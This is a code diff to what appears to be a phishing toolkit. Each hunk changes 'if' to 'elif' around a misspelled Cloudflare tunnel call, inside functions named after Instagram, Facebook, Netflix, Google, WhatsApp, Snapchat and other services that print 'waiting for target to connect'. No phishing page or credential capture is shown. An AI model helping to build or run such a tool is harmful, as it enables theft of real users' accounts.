@@ -243,7 +243,7 @@ def instagram():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -449,7 +449,7 @@ def facebook():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -656,7 +656,7 @@ def netflix():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -863,7 +863,7 @@ def Google():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -1068,7 +1068,7 @@ def Github():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -1271,7 +1271,7 @@ def Pubg():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -1477,7 +1477,7 @@ def follower():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -1683,7 +1683,7 @@ def Whatsapp():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -1871,7 +1871,7 @@ def Tiktok():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -2060,7 +2060,7 @@ def Telegram():
         Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Run Cloudflare====================================================================================================  
-    if link == 2:
+    elif link == 2:
         
         cloudfalre()
         
@@ -2270,7 +2270,7 @@ def Snapchat():
             Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
             
 #Run Cloudflare====================================================================================================  
-        if link == 2:
+        elif link == 2:
             
             cloudfalre()
             
@@ -2475,7 +2475,7 @@ def Snapchat():
             Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
             
 #Run Cloudflare====================================================================================================  
-        if link == 2:
+        elif link == 2:
             
             cloudfalre()
             
